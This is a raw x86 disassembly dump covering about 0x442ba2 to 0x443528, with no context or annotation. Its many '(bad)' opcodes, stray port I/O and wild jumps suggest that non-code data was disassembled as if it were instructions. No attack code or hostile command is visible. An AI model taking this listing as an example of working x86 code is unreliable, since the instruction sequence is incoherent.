  442ba2:	add    eax,0x7ef2e107
  442ba7:	pop    edi
  442ba8:	adc    esp,esi
  442baa:	add    al,0x66
  442bac:	inc    esp
	...
  442bc5:	add    al,dh
  442bc7:	jge    0x442c22
  442bc9:	mov    bh,0x6
  442bcb:	add    eax,0x2e2d36e7
  442bd0:	jl     0x442be5
  442bd2:	in     eax,dx
  442bd3:	jbe    0x442c26
  442bd5:	add    esi,esp
  442bd7:	add    al,0x5e
  442bd9:	mov    DWORD PTR [eax+0xf],edx
  442bdc:	out    0x3,eax
  442bde:	mov    DWORD PTR [ebp-0x14],ebp
  442be1:	stc    
  442be2:	xchg   ebp,eax
  442be3:	neg    DWORD PTR [eax+0x26c3d891]
  442be9:	add    al,0xfd
  442beb:	scas   eax,DWORD PTR es:[edi]
  442bec:	imul   edx,DWORD PTR [edx+0x3e6fb6e],0x56
  442bf3:	jl     0x442b8c
  442bf5:	loop   0x442b9f
  442bf7:	bound  ebx,QWORD PTR [esi-0x36]
  442bfa:	out    0xde,eax
  442bfc:	out    dx,eax
  442bfd:	xchg   ecx,eax
  442bfe:	mov    WORD PTR [esi],cs
  442c00:	out    0x3,eax
  442c02:	in     eax,dx
  442c03:	scas   al,BYTE PTR es:[edi]
  442c04:	jno    0x442bc2
  442c06:	out    0x4,al
  442c08:	out    0x8c,eax
  442c0a:	inc    esi
  442c0b:	std    
  442c0c:	outs   dx,BYTE PTR ds:[esi]
  442c0d:	sbb    bl,bh
  442c0f:	and    DWORD PTR [bx+si],edx
  442c12:	in     eax,dx
  442c13:	scas   al,BYTE PTR es:[edi]
  442c14:	push   ecx
  442c15:	mov    ebx,0x8ce70506
  442c1a:	adc    DWORD PTR ds:[esi-0x2e],ebp
  442c1e:	repz jl 0x442c1c
  442c21:	adc    bh,BYTE PTR [ecx-0x72]
  442c24:	xchg   ebx,eax
  442c25:	adc    dh,ah
  442c27:	add    al,0x98
  442c29:	adc    al,0x0
	...
  442c43:	sbb    bh,BYTE PTR [ebx]
  442c45:	leave  
  442c46:	push   esp
  442c47:	pop    esp
  442c48:	stos   DWORD PTR es:[edi],eax
  442c49:	call   0x492051
  442c4e:	call   0x2bc13f90
  442c53:	leave  
  442c54:	loop   0x442bdc
  442c56:	outs   dx,DWORD PTR ds:[esi]
  442c57:	mov    BYTE PTR [edx],dl
  442c59:	add    cl,ch
  442c5b:	outs   dx,BYTE PTR ds:[esi]
  442c5c:	xchg   edx,eax
  442c5d:	mov    esp,0xe504f7ff
  442c62:	retf   
  442c63:	cld    
  442c64:	mov    dl,0x81
  442c66:	in     eax,0x30
  442c68:	daa    
  442c69:	add    BYTE PTR [edi+0x77829070],al
  442c6f:	jmp    0xa8cb2c78
  442c74:	inc    esi
  442c75:	(bad)  
  442c76:	lock lods al,BYTE PTR gs:[esi]
  442c79:	adc    ch,cl
  442c7b:	imul   ecx
  442c7d:	mov    esi,0xbc7a6eea
  442c82:	div    edi
  442c84:	add    al,0xfd
  442c86:	shr    DWORD PTR [eax],0xea
  442c89:	pmaxsw mm7,QWORD PTR [ebx-0x39]
  442c8d:	clc    
  442c8e:	mov    dh,0x5c
  442c90:	or     BYTE PTR [ebx-0x1f],0xbe
  442c94:	jnp    0x442c28
  442c96:	jge    0x442c8f
  442c98:	add    al,0x0
  442c9a:	jb     0x442cd1
  442c9c:	pop    ebp
  442c9d:	dec    ebx
  442c9e:	xchg   ecx,eax
  442c9f:	cmp    al,0x6c
  442ca1:	test   DWORD PTR [esp+edi*8],ebx
  442ca4:	mov    ebp,0x5f8a
	...
  442cbd:	add    BYTE PTR [eax],al
  442cbf:	add    BYTE PTR [edi-0x2],bh
  442cc2:	(bad)  
  442cc3:	call   0xb62c7038
  442cc8:	pop    ds
  442cc9:	ins    BYTE PTR es:[edi],dx
  442cca:	stc    
  442ccb:	push   cs
  442ccc:	mov    cl,0x81
  442cce:	jecxz  0x442c94
  442cd0:	xor    BYTE PTR [ecx],bh
  442cd2:	int3   
  442cd3:	sub    eax,0xbccc393b
  442cd8:	push   0x73d7d59
  442cdd:	mov    eax,0xfa900084
  442ce2:	sub    cl,cl
  442ce4:	mov    edx,DWORD PTR [ebp+0x32]
  442ce7:	mov    BYTE PTR [ebp+0x14],ch
  442cea:	add    BYTE PTR [eax],al
  442cec:	xor    ah,dh
  442cee:	mov    dl,0x0
  442cf0:	pop    ebp
  442cf1:	add    ah,bl
  442cf3:	pop    es
  442cf4:	rol    BYTE PTR [ebp+0x1d],1
  442cf7:	add    dh,dl
  442cf9:	ds in  eax,dx
  442cfb:	mov    ebp,DWORD PTR [ebp+0x1d000e85]
  442d01:	std    
  442d02:	scas   al,BYTE PTR es:[edi]
  442d03:	adc    al,0x67
  442d05:	jns    0x442cb7
  442d07:	cwde   
  442d08:	cmp    eax,DWORD PTR [edx]
  442d0a:	add    BYTE PTR [edi],cl
  442d0c:	retf   
  442d0d:	adc    eax,0x3b844129
  442d12:	in     eax,dx
  442d13:	mov    eax,DWORD PTR [ebp+0xd000eac]
  442d19:	jns    0x442d68
  442d1b:	cld    
  442d1c:	pop    eax
  442d1d:	rol    DWORD PTR [esi],cl
  442d1f:	test   ecx,ebx
	...
  442d3d:	rcl    BYTE PTR [esi-0x54304c84],cl
  442d43:	adc    BYTE PTR [eax],al
  442d45:	fld    QWORD PTR [ecx]
  442d47:	and    edx,edi
  442d49:	(bad)  
  442d4a:	mov    ebx,0x96d25475
  442d4f:	xor    al,0xb3
  442d51:	jmp    0x442dcc
  442d53:	into   
  442d54:	data16 outs dx,BYTE PTR ds:[esi]
  442d56:	loop   0x442cda
  442d58:	dec    eax
  442d59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442d5a:	inc    edi
  442d5b:	add    dl,BYTE PTR [eax-0x8cb]
  442d61:	xchg   edx,eax
  442d62:	xchg   edi,eax
  442d63:	cwde   
  442d64:	mov    eax,0x8b0001ab
  442d69:	dec    ebp
  442d6a:	cmc    
  442d6b:	xchg   DWORD PTR [esp+edi*2],ebx
  442d6e:	out    dx,al
  442d6f:	aas    
  442d70:	adc    al,0xf4
  442d72:	pop    esi
  442d73:	stos   DWORD PTR es:[edi],eax
  442d74:	cwde   
  442d75:	lods   eax,DWORD PTR ds:[esi]
  442d76:	ins    DWORD PTR es:[edi],dx
  442d77:	std    
  442d78:	(bad)  
  442d79:	jg     0x442d2e
  442d7b:	or     DWORD PTR [ebp+0x1c8573c4],eax
  442d81:	add    eax,0xeabc93e3
  442d86:	pop    ebx
  442d87:	std    
  442d88:	clc    
  442d89:	mov    ah,0x67
  442d8b:	xchg   BYTE PTR [ebx-0x14],bl
  442d8e:	int3   
  442d8f:	adc    esp,DWORD PTR [esi]
  442d91:	cs jne 0x442de2
  442d94:	jmp    0xf492:0xf0378781
  442d9b:	mov    bl,0xb8
  442d9d:	or     bl,BYTE PTR [ebp+edi*8-0x1c]
	...
  442db9:	add    BYTE PTR [esi+esi*2],al
  442dbc:	xchg   BYTE PTR [edi+eax*2],dl
  442dbf:	jge    0x442e0f
  442dc1:	ficom  WORD PTR [edx-0x1547728c]
  442dc7:	pop    ebx
  442dc8:	std    
  442dc9:	cld    
  442dca:	sub    ah,ah
  442dcc:	test   BYTE PTR [edx+ecx*1+0x3984fd6e],bh
  442dd3:	mov    ds:0x3c948836,al
  442dd8:	std    
  442dd9:	(bad)  
  442dda:	jmp    0x442dcb
  442ddc:	(bad)  
  442ddf:	mov    bl,0x2
  442de1:	mov    cl,0x8f
  442de3:	jo     0x442dde
  442de5:	inc    ebx
  442de7:	xlat   BYTE PTR ds:[ebx]
  442de8:	test   BYTE PTR [edx+eiz*8+0x4b5fd6d],bh
  442def:	outs   dx,BYTE PTR ds:[esi]
  442df0:	std    
  442df1:	(bad)  
  442df2:	fild   WORD PTR [edx-0xc0c39ca]
  442df8:	cmp    eax,0x26e9bfe
  442dfd:	mov    cl,0x47
  442dff:	outs   dx,BYTE PTR ds:[esi]
  442e00:	stc    
  442e01:	dec    DWORD PTR [ebx-0x597536fb]
  442e07:	jmp    0x442e3e
  442e09:	popa   
  442e0a:	jno    0x442dd9
  442e0c:	(bad)  
  442e0e:	cli    
  442e0f:	je     0x442da0
  442e11:	or     eax,0xadf204f4
  442e16:	jl     0x442db5
  442e18:	rol    DWORD PTR [ebx],1
  442e1a:	hlt    
  442e1b:	(bad)  
  442e1c:	xchg   edi,eax
  442e1d:	sldt   WORD PTR [eax]
	...
  442e34:	add    BYTE PTR [eax],al
  442e36:	add    BYTE PTR [ecx+eax*1-0x28],bh
  442e3a:	jbe    0x442df0
  442e3c:	clc    
  442e3d:	icebp  
  442e3e:	lods   eax,DWORD PTR ds:[esi]
  442e3f:	pop    esp
  442e40:	sahf   
  442e41:	icebp  
  442e42:	add    esi,esp
  442e44:	(bad)  
  442e45:	lahf   
  442e46:	vmwrite esi,DWORD PTR [ebp-0x9f77422]
  442e4d:	ins    DWORD PTR es:[edi],dx
  442e4e:	xchg   ebx,eax
  442e4f:	pusha  
  442e50:	sti    
  442e51:	out    0x3,al
  442e53:	sbb    eax,0xe4b4dac5
  442e58:	cs sbb eax,0x747338dd
  442e5e:	enter  0x54c9,0x3a
  442e62:	mov    ebp,DWORD PTR [ecx+eiz*4-0x7]
  442e66:	add    esi,esp
  442e68:	jmp    0x3e6:0xfaacb45f
  442e6f:	shr    BYTE PTR ds:[ebp+0x5f],0x3f
  442e74:	dec    eax
  442e75:	loop   0x442e24
  442e77:	mov    ss,WORD PTR [ebp+ebx*1-0x3c]
  442e7b:	retf   
  442e7c:	adc    bl,BYTE PTR [edx-0x70]
  442e7f:	mov    DWORD PTR [edx],ecx
  442e81:	jecxz  0x442e86
  442e83:	hlt    
  442e84:	lahf   
  442e85:	test   DWORD PTR [ebx],0x59be04f4
  442e8b:	jae    0x442e46
  442e8d:	jle    0x442e18
  442e8f:	inc    edi
  442e90:	or     eax,0xe61e48be
  442e95:	jmp    ebp
  442e97:	pusha  
  442e98:	js     0x442e50
  442e9a:	in     eax,0x0
	...
  442eb4:	mov    esp,DWORD PTR [ebx-0x7]
  442eb7:	jo     0x442e6c
  442eb9:	jae    0x442f1d
  442ebb:	cmp    dl,BYTE PTR [esi]
  442ebd:	mov    cl,BYTE PTR [eax-0x1f]
  442ec0:	push   ecx
  442ec1:	or     dl,BYTE PTR [eax+0x4fa91]
  442ec7:	not    BYTE PTR [ecx-0x8284784]
  442ecd:	add    al,0x85
  442ecf:	cdq    
  442ed0:	add    ecx,DWORD PTR [ebp-0x3b3f27e4]
  442ed6:	adc    esi,esi
  442ed8:	xchg   ecx,eax
  442ed9:	jl     0x442e92
  442edb:	div    edi
  442edd:	add    al,0x85
  442edf:	mov    eax,ds:0xe1508a03
  442ee4:	jg     0x442ee6
  442ee6:	(bad)  
  442ee8:	mov    BYTE PTR [eax-0x760816ee],ah
  442eee:	pop    ebx
  442eef:	stc    
  442ef0:	mov    ah,al
  442ef2:	adc    edi,DWORD PTR [eax]
  442ef4:	loopne 0x442f20
  442ef6:	(bad)  
  442ef7:	dec    edi
  442ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442ef9:	imul   eax,DWORD PTR [ebp+0x548f782c],0x908a67e3
  442f03:	(bad)  
  442f04:	stc    
  442f05:	add    al,0x0
  442f07:	dec    edi
  442f08:	outs   dx,DWORD PTR ds:[esi]
  442f09:	jge    0x442ec3
  442f0b:	xlat   BYTE PTR ds:[ebx]
  442f0c:	test   DWORD PTR [eiz*8-0x6b764e2e],0x6cb73
  442f17:	jmp    0x442f1c
	...
  442f30:	add    BYTE PTR [ecx-0x10f821af],ah
  442f36:	je     0x442ef0
  442f38:	push   edi
  442f3a:	add    al,0xfd
  442f3c:	sbb    ebp,DWORD PTR [eax]
  442f3e:	mov    cl,BYTE PTR [eax+0x103900]
  442f44:	add    BYTE PTR [esi],ah
  442f46:	cli    
  442f47:	mov    ah,0xa8
  442f49:	fisttp WORD PTR [eax-0x7]
  442f4c:	mov    ah,al
  442f4e:	fadd   QWORD PTR [eax-0x2d1ce2a3]
  442f54:	je     0x442eed
  442f56:	sub    eax,0x4ccdbd34
  442f5b:	cmp    DWORD PTR [eax],eax
  442f5d:	(bad)  
  442f5e:	lea    edi,[esi+edx*1+0x10b7064d]
  442f65:	dec    ebp
  442f66:	push   es
  442f67:	add    BYTE PTR [ebx],ch
  442f69:	push   es
  442f6a:	sbb    eax,0x406d7ec7
  442f6f:	test   dh,bh
  442f71:	jae    0x442f28
  442f73:	fimul  WORD PTR [ebx+0x95e0e85]
  442f79:	lds    ebx,FWORD PTR [ebp+0x91d000e]
  442f7f:	scas   al,BYTE PTR es:[edi]
  442f80:	cwde   
  442f81:	mov    ch,0xf
  442f83:	add    BYTE PTR [eax],al
  442f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442f86:	pop    ebp
  442f87:	or     eax,0xf71f2988
  442f8c:	inc    eax
  442f8d:	and    DWORD PTR [ecx],ecx
  442f8f:	scas   al,BYTE PTR es:[edi]
  442f90:	cwde   
  442f91:	push   esp
  442f92:	(bad)  
  442f93:	(bad)  
  442f94:	inc    DWORD PTR [eax]
	...
  442fae:	xchg   BYTE PTR [eax-0x2ba74ff],ah
  442fb4:	xchg   DWORD PTR [edx+ecx*8],ebx
  442fb7:	loop   0x442f50
  442fb9:	mov    esp,0xff0005c3
  442fbe:	or     eax,0xf710a8fd
  442fc3:	and    DWORD PTR [esi-0x2d],ebx
  442fc6:	mov    esp,ecx
  442fc8:	inc    esp
  442fc9:	lock dec eax
  442fcb:	inc    ebp
  442fcc:	add    al,0xf0
  442fce:	repz fild QWORD PTR [edi-0x29e0b48]
  442fd5:	call   FWORD PTR [edi-0x653318c1]
  442fdb:	adc    ebx,edi
  442fdd:	scas   eax,DWORD PTR es:[edi]
  442fde:	pop    esp
  442fdf:	cmp    ebp,edi
  442fe1:	push   edi
  442fe3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442fe4:	jnp    0x442f6e
  442fe6:	dec    eax
  442fe7:	cmp    ebp,edi
  442fe9:	jmp    FWORD PTR [esi]
  442feb:	aad    0xd6
  442fed:	sti    
  442fee:	jne    0x442fd5
  442ff0:	add    edi,edi
  442ff2:	jae    0x44305f
  442ff4:	repnz push es
  442ff6:	sti    
  442ff7:	jns    0x442fab
  442ff9:	lock lods al,BYTE PTR ds:[esi]
  442ffb:	stos   DWORD PTR es:[edi],eax
  442ffc:	std    
  442ffd:	in     al,0xe8
  442fff:	(bad)  
  443000:	cmp    DWORD PTR [edi-0x4e018da3],edi
  443006:	test   DWORD PTR [ebx],ebx
  443008:	mov    ebx,0xbed6f43f
  44300d:	or     ebp,ebx
  44300f:	mov    edx,0xaeef
	...
  443028:	add    BYTE PTR [eax],al
  44302a:	add    dh,dh
  44302c:	out    0x7b,al
  44302e:	mov    esp,0xb4fd6c02
  443033:	add    al,0x6c
  443035:	std    
  443036:	dec    edi
  443038:	add    bh,BYTE PTR [ebx+0x7b]
  44303b:	add    al,0x96
  44303d:	cmp    bh,BYTE PTR [edx-0x6c]
  443040:	out    0xd6,al
  443042:	or     esi,ebx
  443044:	sub    BYTE PTR [ecx],0xae
  443047:	xchg   edx,eax
  443048:	(bad)  
  443049:	push   ebp
  44304a:	(bad)  
  44304b:	(bad)  
  44304c:	dec    esp
  44304d:	jp     0x443097
  44304f:	cld    
  443050:	(bad)  
  443051:	cli    
  443052:	(bad)  
  443053:	pushf  
  443054:	inc    eax
  443055:	std    
  443056:	(bad)  
  443057:	jmp    0x443030
  443059:	test   BYTE PTR [eax-0x7b029216],bh
  44305f:	and    al,0x3a
  443061:	jne    0x44307f
  443063:	in     eax,0x4
  443065:	mov    ds:0x2f8be7c3,al
  44306a:	sbb    ch,bh
  44306c:	xchg   esi,eax
  44306d:	outs   dx,DWORD PTR ds:[esi]
  44306e:	lods   al,BYTE PTR ds:[esi]
  44306f:	push   es
  443070:	add    eax,0xd447ee7
  443075:	outs   dx,DWORD PTR ds:[esi]
  443076:	por    mm1,QWORD PTR [ebx+0x4e6af57]
  44307d:	out    0x72,eax
  44307f:	xor    al,0xf9
  443081:	aaa    
  443082:	adc    ebx,edx
  443084:	dec    edx
  443085:	leave  
  443086:	push   esi
  443087:	lea    ecx,[esp+ebp*4-0x2346808d]
  44308e:	jae    0x443090
	...
  4430a8:	jae    0x44311f
  4430aa:	mov    ebx,DWORD PTR [ecx]
  4430ac:	hlt    
  4430ad:	add    al,0x6e
  4430af:	fcomp  DWORD PTR [edi-0x19]
  4430b2:	outs   dx,DWORD PTR ds:[esi]
  4430b3:	stos   DWORD PTR es:[edi],eax
  4430b4:	mov    edi,?
  4430b6:	out    0x3,al
  4430b8:	push   ecx
  4430b9:	(bad)  
  4430ba:	pop    ebp
  4430bb:	shr    bh,1
  4430bd:	out    0x6d,al
  4430bf:	jns    0x96aa66ac
  4430c5:	or     eax,0x506ab6f
  4430ca:	out    0x6,eax
  4430cc:	sub    eax,0x6af6f8e
  4430d1:	add    eax,0x99d07ee7
  4430d6:	mov    bh,0xc6
  4430d8:	retf   
  4430d9:	add    al,0x5e
  4430db:	sar    bl,1
  4430dd:	mov    edx,esp
  4430df:	add    DWORD PTR [eax-0x78],esi
  4430e2:	fdiv   QWORD PTR [ecx-0x13]
  4430e5:	sub    edi,ebx
  4430e7:	mov    dh,0x5c
  4430e9:	shl    DWORD PTR [esi],1
  4430eb:	add    al,0x79
  4430ed:	mov    WORD PTR [ebx+0x7904f41a],es
  4430f3:	adc    al,0xf4
  4430f5:	add    al,0x0
  4430f7:	jmp    0x9f7986e4
  4430fc:	cmc    
  4430fd:	mov    dl,BYTE PTR [edi-0x5c]
  443100:	inc    ebp
  443101:	pop    esi
  443102:	bound  esi,QWORD PTR [edx+0x2a]
  443105:	jecxz  0x4430d3
  443107:	(bad)
  44310b:	pop    es
	...
  443124:	add    BYTE PTR [edi-0x8204751],bl
  44312a:	add    al,0x9
  44312c:	aaa    
  44312d:	sbb    BYTE PTR [edx+edx*1+0x7089f7e9],0xd5
  443135:	inc    DWORD PTR [eax]
  443137:	das    
  443138:	data16 mov al,0xf3
  44313b:	or     BYTE PTR [edi-0x16ed6880],dl
  443141:	test   DWORD PTR [ecx-0x331f0a90],0xb047107
  44314b:	test   DWORD PTR [ecx-0x7c],esp
  44314e:	repnz (bad) 
  443150:	call   0x7857f619
  443155:	call   0xa0d3f680
  44315a:	bound  si,DWORD PTR [eax-0x78]
  44315e:	pushf  
  44315f:	adc    ch,cl
  443161:	test   DWORD PTR [ebx-0x76582dac],0x749ef15b
  44316b:	mov    esp,0xe704f7d7
  443170:	fistp  DWORD PTR [edx-0x7f7806a3]
  443176:	xchg   ecx,eax
  443177:	add    ch,ch
  443179:	test   DWORD PTR [edx+eiz*2],0x6e359ba
  443180:	jns    0x443121
  443182:	repz (bad) 
  443184:	call   0x9d7d81
	...
  4431a1:	add    BYTE PTR [ebx],dl
  4431a3:	fiadd  DWORD PTR [edi+0x2abbc]
  4431a9:	pop    ebx
  4431aa:	push   esi
  4431ab:	out    0x54,eax
  4431ad:	ret    
  4431ae:	popa   
  4431af:	push   ds
  4431b0:	int3   
  4431b1:	int3   
  4431b2:	sbb    DWORD PTR [esi],0x1e61cccc
  4431b8:	int3   
  4431b9:	int3   
  4431ba:	inc    edi
  4431bb:	push   ebp
  4431bc:	mov    ecx,0xc0197eff
  4431c1:	lea    esp,[ebx]
  4431c3:	jbe    0x4431c5
  4431c5:	add    BYTE PTR [ebp+0xb0040df],bl
  4431cb:	enter  0x73f8,0x9b
  4431cf:	ins    BYTE PTR es:[edi],dx
  4431d0:	jl     0x44320b
  4431d2:	lea    edx,[edi+0x3f]
  4431d5:	inc    eax
  4431d6:	faddp  st(2),st
  4431d8:	add    edx,ecx
  4431da:	mov    bh,0x88
  4431dc:	clc    
  4431dd:	pop    ds
  4431de:	xor    eax,eax
  4431e0:	pop    ebp
  4431e1:	xor    DWORD PTR [ebx-0x56],0x0
  4431e5:	add    BYTE PTR [ebp+0x2],bl
  4431e8:	ins    DWORD PTR es:[edi],dx
  4431e9:	xor    al,0x3b
  4431eb:	mov    DWORD PTR [esi+0x24dbc],esi
  4431f1:	add    BYTE PTR [eax+0x0],bl
  4431f4:	pop    esi
  4431f5:	adc    ebx,0x19
  4431f8:	add    BYTE PTR [eax],al
  4431fa:	sbb    eax,0xc5206d02
  4431ff:	and    DWORD PTR [eax],eax
  443201:	add    BYTE PTR ds:0x1485df,cl
	...
  44321f:	sbb    al,0x2
  443221:	add    BYTE PTR [eax+0x31897b],dl
  443227:	mov    BYTE PTR [ebx],al
  443229:	inc    eax
  44322a:	or     DWORD PTR [ebp+ecx*1+0x35],0x0
  44322f:	fadd   QWORD PTR [ecx]
  443231:	add    BYTE PTR [esp+esi*8+0x46],bh
  443235:	sub    eax,0x373b7c0
  44323a:	add    ah,dh
  44323c:	imul   edi,DWORD PTR [esi],0xffffffcc
  44323f:	shr    BYTE PTR [edi+0x5ab8cc40],0x3d
  443246:	push   edx
  443247:	outs   dx,DWORD PTR ds:[esi]
  443248:	pushf  
  443249:	jge    0x44322d
  44324b:	cmc    
  44324c:	push   edx
  44324d:	inc    ebx
  44324e:	inc    esi
  44324f:	lds    esi,FWORD PTR [ebp+edi*8-0x41]
  443253:	jno    0x4431ee
  443255:	jmp    0xcac7f849
  44325a:	mov    esp,0xcc4097a8
  44325f:	shr    BYTE PTR [edi-0x1d4733c0],0x7b
  443266:	mov    esp,0x4cfd6bea
  44326b:	ja     0x443251
  44326d:	adc    esi,DWORD PTR [ebx+0x2b]
  443270:	outs   dx,DWORD PTR ds:[esi]
  443271:	mov    bl,0x98
  443273:	lods   al,BYTE PTR ds:[esi]
  443274:	pop    ebp
  443275:	std    
  443276:	jmp    FWORD PTR [edi-0x65]
  443279:	adc    DWORD PTR [ebp+0x1c7553ac],eax
  44327f:	in     eax,0x1e
  443281:	les    edx,FWORD PTR [ebx]
	...
  44329b:	add    bl,bh
  44329d:	fisttp QWORD PTR [ebx-0x2941549]
  4432a3:	test   BYTE PTR [edi+ebx*2-0x2c03af8a],ch
  4432aa:	(bad)  
  4432ab:	movntps XMMWORD PTR [ebx-0x7ad2d2ef],xmm5
  4432b2:	jl     0x44323c
  4432b4:	pop    esp
  4432b5:	cmp    eax,0xd37dfffd
  4432ba:	scas   eax,DWORD PTR es:[edi]
  4432bb:	adc    dh,ah
  4432bd:	imul   eax,esi,0xffffffbc
  4432c0:	ja     0x443316
  4432c2:	cmc    
  4432c3:	jnp    0x443298
  4432c5:	add    al,0x6e
  4432c7:	sar    ebx,cl
  4432c9:	(bad)  
  4432ca:	das    
  4432cb:	sbb    BYTE PTR [edx+0x7d],dh
  4432ce:	(bad)  
  4432cf:	adc    eax,0xf5f04f4
  4432d4:	repnz or edi,DWORD PTR [ecx-0x6d]
  4432d8:	mov    esi,ebx
  4432da:	out    0x3,al
  4432dc:	int    0xc5
  4432de:	fiadd  DWORD PTR [edx+0x3d19974]
  4432e4:	hlt    
  4432e5:	pop    esp
  4432e6:	or     DWORD PTR [ebp-0x7c],edi
  4432e9:	popf   
  4432ea:	icebp  
  4432eb:	add    esi,esp
  4432ed:	mov    edi,0x49b03fa5
  4432f2:	fwait
  4432f3:	aas    
  4432f4:	test   al,0x49
  4432f6:	mov    bl,0x3f
  4432f8:	ror    BYTE PTR [ecx-0x55],0x3f
  4432fc:	mov    eax,0x7b5e49
	...
  443319:	inc    eax
  44331a:	repz out 0x3,al
  44331d:	sub    DWORD PTR [eax+0x26edfb60],ecx
  443323:	jmp    0xf403:0xf99d8cb5
  44332a:	(bad)  
  44332b:	mov    bh,0x17
  44332d:	jno    0x4432fc
  44332f:	out    dx,al
  443330:	jnp    0x443322
  443332:	cmc    
  443333:	cmp    ebx,eax
  443335:	out    0x8f,eax
  443337:	lahf   
  443338:	pop    ss
  443339:	jns    0x4432f0
  44333b:	fdivp  st(6),st
  44333d:	test   DWORD PTR [ebp+0x60],edi
  443340:	adc    eax,0x130e04f4
  443345:	ja     0x443395
  443347:	xchg   ecx,eax
  443348:	adc    DWORD PTR [ecx-0x33],edi
  44334b:	fidivr WORD PTR [edx-0x3c]
  44334e:	lock ins BYTE PTR es:[edi],dx
  443350:	mov    ecx,DWORD PTR [ebx+esi*8-0x1a]
  443354:	add    edi,DWORD PTR [ecx+edi*8-0x1]
  443358:	xlat   BYTE PTR ds:[ebx]
  443359:	xchg   edx,eax
  44335a:	les    edx,FWORD PTR [ebx]
  44335c:	mov    edx,0x7186e6b8
  443361:	mov    al,ds:0x6ee8fff6
  443366:	lea    edi,[edi+edi*8-0x55aafb09]
  44336d:	xor    al,0x49
  44336f:	int3   
  443370:	mov    ch,0x34
  443372:	dec    ecx
  443373:	int3   
  443374:	lods   eax,DWORD PTR ds:[esi]
  443375:	xor    al,0x49
  443377:	int3   
  443378:	sbb    al,0x3d
  44337a:	imul   ecx,DWORD PTR [ebp+0x17],0x0
	...
  443395:	add    BYTE PTR ds:0x509b8534,bh
  44339b:	mov    edi,ecx
  44339d:	sahf   
  44339e:	sbb    edx,ebx
  4433a0:	jp     0x443383
  4433a2:	not    eax
  4433a4:	cmp    eax,0x84f75862
  4433a9:	sbb    DWORD PTR [eax+0x18d81c83],edx
  4433af:	lds    edx,FWORD PTR [ebx]
  4433b1:	bound  ebp,QWORD PTR [eax-0x779daefd]
  4433b7:	test   DWORD PTR [edx+esi*1+0x710863b7],0xa9f8f5f4
  4433c2:	or     eax,DWORD PTR [edx-0x4b230a88]
  4433c8:	pop    es
  4433c9:	jae    0x4433d8
  4433cb:	push   edi
  4433cc:	iret   
  4433cd:	jno    0x4433c3
  4433cf:	cmc    
  4433d0:	clc    
  4433d1:	test   eax,0xd57881eb
  4433d6:	mov    esp,0xed7207b4
  4433db:	push   ebp
  4433dc:	iret   
  4433dd:	sub    bh,cl
  4433df:	or     al,0x88
  4433e1:	in     eax,0x8
  4433e3:	pop    esi
  4433e4:	inc    eax
  4433e5:	cmc    
  4433e6:	sub    BYTE PTR [esi+0x279100d5],al
  4433ec:	test   DWORD PTR [ebx+0x71d],ebx
  4433f2:	xchg   esi,eax
  4433f3:	cwde   
  4433f4:	or     eax,0x445f5d8b
  4433f9:	mov    DWORD PTR [eax],eax
	...
  443413:	cmp    BYTE PTR [ecx-0x7d],bl
  443416:	push   ds
  443417:	or     cl,BYTE PTR gs:[ecx]
  44341a:	mov    ebp,DWORD PTR [eax]
  44341c:	pop    ecx
  44341d:	clc    
  44341e:	inc    eax
  44341f:	loope  0x443461
  443421:	jle    0x4433fe
  443423:	adc    bl,ah
  443425:	push   ebp
  443426:	pop    ebx
  443427:	call   0xe110ffef
  44342c:	fucomi st,st(3)
  44342e:	cmp    DWORD PTR [ecx+0x26],0x4e
  443432:	lea    edx,[eax]
  443434:	out    0x2a,eax
  443436:	leave  
  443437:	adc    eax,0x8d000007
  44343c:	std    
  44343d:	int    0x8d
  44343f:	rol    DWORD PTR [edi+ebx*2-0x75],0x91
  443444:	adc    esp,eax
  443446:	data16 sahf 
  443448:	xlat   BYTE PTR ds:[ebx]
  443449:	pop    ebp
  44344a:	add    eax,DWORD PTR [ebx]
  44344c:	pop    ecx
  44344d:	mov    al,0xce
  44344f:	repz fisttp QWORD PTR [ebx+0x45]
  443453:	mov    ebp,0x5af87c45
  443458:	push   0x82c333dd
  44345d:	sar    DWORD PTR [eax-0xf],cl
  443460:	push   edi
  443461:	mov    al,0x54
  443463:	rol    BYTE PTR [ebx],cl
  443465:	jge    0x443439
  443467:	xor    eax,0x3391b706
  44346d:	(bad)  [ebx-0x76a0b9eb]
  443473:	popa   
  443474:	xor    ebx,ecx
  443476:	call   0x44347b
	...
  44348f:	add    BYTE PTR [ebp-0x18],cl
  443492:	idiv   bh
  443494:	hlt    
  443495:	mov    DWORD PTR [esi+0x4],esi
  443498:	arpl   WORD PTR [edx+0x1f92ed28],sp
  44349e:	retf   
  44349f:	test   BYTE PTR [ecx],dl
  4434a1:	jns    0x4434e3
  4434a3:	int3   
  4434a4:	xor    BYTE PTR [ecx+0x78],bh
  4434a7:	in     al,dx
  4434a8:	ja     0x443502
  4434aa:	test   BYTE PTR [ecx+edi*1+0x7f50d254],0x23
  4434b2:	jns    0x4434f4
  4434b4:	in     al,dx
  4434b5:	out    0xd3,al
  4434b7:	or     ebp,DWORD PTR [edi+0x53]
  4434ba:	add    bh,0xd3
  4434bd:	pop    esi
  4434be:	cmp    eax,0x7b442187
  4434c3:	dec    ebx
  4434c4:	shr    BYTE PTR [edx+0x6be0507e],0xfd
  4434cb:	push   esp
  4434cd:	imul   edi,ebp,0xffffffc0
  4434d0:	jb     0x4434e1
  4434d2:	adc    BYTE PTR [eax],al
  4434d4:	hlt    
  4434d5:	xor    BYTE PTR [ebx],al
  4434d7:	add    ah,dh
  4434d9:	loopne 0x44352c
  4434db:	jp     0x4434a7
  4434dd:	or     DWORD PTR [ecx-0x16948cc4],eax
  4434e3:	sbb    eax,0x13d3e983
  4434e8:	hlt    
  4434e9:	imul   edi,DWORD PTR [edx-0x6e],0xffffffc4
  4434ed:	push   edi
  4434ee:	std    
  4434ef:	(bad)  
  4434f0:	jge    0x4434d1
  4434f2:	lea    ebx,[eax+eax*1+0x0]
	...
  44350a:	add    BYTE PTR [eax],al
  44350c:	add    bh,ch
  44350e:	imul   edi,ebp,0xffffff86
  443511:	mov    cl,0xc7
  443513:	cmp    eax,0x9a40484
  443518:	add    ah,dh
  44351a:	imul   edi,DWORD PTR [edx-0x38],0x4f
  44351e:	push   0x32
  443520:	into   
  443521:	shl    ah,cl
  443523:	iret   
  443524:	xor    dh,0x4
  443527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443528:	cs mov bh,0x5c
